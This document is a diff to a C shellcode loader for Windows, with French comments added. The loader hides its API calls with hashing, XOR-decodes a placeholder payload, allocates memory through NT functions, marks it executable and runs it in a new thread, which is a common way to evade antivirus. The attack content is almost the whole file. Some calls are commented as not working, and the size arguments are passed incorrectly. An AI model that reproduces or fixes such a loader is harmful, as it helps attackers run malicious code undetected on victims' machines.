@@ -1,6 +1,6 @@
 #include <windows.h>
-#include <winternl.h>
 #include <stdio.h>
+#include <winternl.h>
 
 #define TRUE 1
 #define FALSE 0
@@ -49,6 +49,33 @@ typedef NTSYSAPI NTSTATUS(NTAPI* NtWaitForSingleObj)(
     BOOLEAN Alertable,
     PLARGE_INTEGER Timeout
 );
+
+// Fonction pour afficher un message d'erreur lisible
+void PrintLastErrorMessage() {
+    DWORD errorMessageID = GetLastError(); // Récupère le dernier code d'erreur
+    if (errorMessageID == 0) {
+        printf("Pas d'erreur.\n");
+        return;
+    }
+
+    LPSTR messageBuffer = NULL;
+
+    // Récupère le message d'erreur associé au code
+    FormatMessageA(
+        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+        NULL,
+        errorMessageID,
+        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+        (LPSTR)&messageBuffer,
+        0,
+        NULL
+    );
+
+    printf("Erreur : %s\n", messageBuffer);
+
+    // Libère la mémoire allouée pour le message
+    LocalFree(messageBuffer);
+}
 
 HMODULE CustomGetModuleHandle(unsigned int module_hash) {
     #ifdef _WIN64
@@ -172,10 +199,10 @@ void main() {
     // printf("country: %s\n", country);
     
     unsigned char payload[] = "%SHELLCODE%";
-    void* exec = NULL;
-    DWORD old_protect;
-    BOOL rv;
+    void* exec;
+    DWORD old_protect = 0;
     HANDLE th;
+    BOOL rv;
 
     unsigned int ndtll_hash = 0x69e00346;   // ROL17
     unsigned int virtual_alloc_hash = 0x96124679; // ROR23
@@ -196,7 +223,7 @@ void main() {
     // Allocating executable memory
     exec = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     // NOT WORKING
-    // _NtAlocVirtMem((HANDLE)-1, &exec, 0, (PSIZE_T)sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    _NtAlocVirtMem((HANDLE)-1, &exec, 0, (PSIZE_T)sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     // XORing shellcode
     for (size_t i = 0; i < sizeof(payload); i++) {
@@ -208,11 +235,10 @@ void main() {
 
     // Changing memory protection to PAGE_EXECUTE_READ
     // VirtualProtect(exec, sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
+    // VirtualProtect(exec, sizeof(payload), PAGE_READWRITE, &old_protect);
     // NOT WORKING
-    if (_NtProtectVirtMem((HANDLE)-1, &exec, (PSIZE_T)sizeof(payload), PAGE_EXECUTE_READ, &old_protect) != 0) {
-        DWORD errCode = RtlNtStatusToDosError(GetLastError());
-        printf("Error in VirtualProtect to PAGE_EXECUTE_READ: %lu\n", errCode);
-    }
+    _NtProtectVirtMem((HANDLE)-1, &exec, (PSIZE_T)sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
+
 
     // Executing shellcode in a new thread
     _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, FALSE, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
